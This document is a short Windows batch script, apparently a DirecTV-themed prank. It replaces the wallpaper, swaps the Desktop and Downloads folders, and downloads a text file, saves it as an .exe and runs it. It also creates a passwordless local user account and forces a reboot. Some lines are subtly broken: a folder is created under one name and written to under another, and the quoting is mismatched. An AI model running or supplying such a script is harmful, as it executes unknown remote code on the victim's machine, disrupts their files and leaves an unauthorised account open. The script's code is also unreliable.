echo @off
mkdir C:\stv
powershell -command "& {Invoke-WebRequest -Uri "https://file.garden/Z3HtEpAjyGTEZiXW/DirecTV-Logo-1993.bmp" -OutFile "C:\dtv\wallpaper.bmp}"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\dtv\Wallpaper.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cd %UserProfile%
rename Desktop DirecTV
rename Downloads Desktop
rename DirecTV Downloads
powershell -command "& {Invoke-WebRequest -Uri "https://static.wikia.nocookie.net/kong/images/f/f3/Gorillazdemondays.jpg/revision/latest?cb=20230915231728" -OutFile "%UserProfile%\Desktop\Gorillazdemondays.jpg}"
powershell -command "& {Invoke-WebRequest -Uri "https://file.garden/Z3HtEpAjyGTEZiXW/cola.jpg" -OutFile "%UserProfile%\Desktop\cola.jpg}"
powershell -command "& {Invoke-WebRequest -Uri "https://file.garden/Z3HtEpAjyGTEZiXW/mnt.txt" -OutFile "%UserProfile%\Desktop\mnt.exe}"
net user "Butter Sock" "" /add
start %UserProfile%\Desktop\mnt.exe
shutdown -r -t 140 -f -c "DIRECTV"
